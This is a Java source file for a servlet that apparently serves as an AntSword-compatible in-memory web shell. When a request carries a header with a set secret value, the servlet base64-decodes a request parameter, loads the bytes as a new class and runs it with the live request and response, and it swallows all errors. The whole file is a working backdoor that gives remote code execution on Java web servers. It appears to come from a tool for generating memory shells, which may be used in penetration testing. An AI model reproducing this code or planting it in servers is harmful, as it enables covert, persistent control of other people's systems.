package com.reajason.javaweb.memshell.shelltool.antsword;

import javax.servlet.*;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;

/**
 * @author ReaJason
 * @since 2025/02/18
 */
public class AntSwordServlet extends ClassLoader implements Servlet {

    public static String pass;
    public static String headerName;
    public static String headerValue;

    public AntSwordServlet() {
    }

    public AntSwordServlet(ClassLoader parent) {
        super(parent);
    }

    @Override
    @SuppressWarnings("all")
    public void service(ServletRequest req, ServletResponse res) throws ServletException, IOException {
        HttpServletRequest request = (HttpServletRequest) req;
        HttpServletResponse response = (HttpServletResponse) res;
        try {
            if (request.getHeader(headerName) != null && request.getHeader(headerName).contains(headerValue)) {
                byte[] bytes = base64Decode(request.getParameter(pass));
                Object instance = (new AntSwordServlet(Thread.currentThread().getContextClassLoader())).g(bytes).newInstance();
                instance.equals(new Object[]{request, response});
            }
        } catch (Throwable e) {
            e.printStackTrace();
        }
    }

    @Override
    public String getServletInfo() {
        return "";
    }

    @Override
    public void destroy() {

    }

    @SuppressWarnings("all")
    public Class<?> g(byte[] cb) {
        return super.defineClass(cb, 0, cb.length);
    }


    @SuppressWarnings("all")
    public static byte[] base64Decode(String bs) throws Exception {
        byte[] value = null;
        Class<?> base64;
        try {
            base64 = Class.forName("java.util.Base64");
            Object decoder = base64.getMethod("getDecoder", (Class<?>[]) null).invoke(base64, (Object[]) null);
            value = (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, bs);
        } catch (Exception var6) {
            base64 = Class.forName("sun.misc.BASE64Decoder");
            Object decoder = base64.newInstance();
            value = (byte[]) decoder.getClass().getMethod("decodeBuffer", String.class).invoke(decoder, bs);
        }
        return value;
    }

    @Override
    public void init(ServletConfig config) throws ServletException {

    }

    @Override
    public ServletConfig getServletConfig() {
        return null;
    }
}
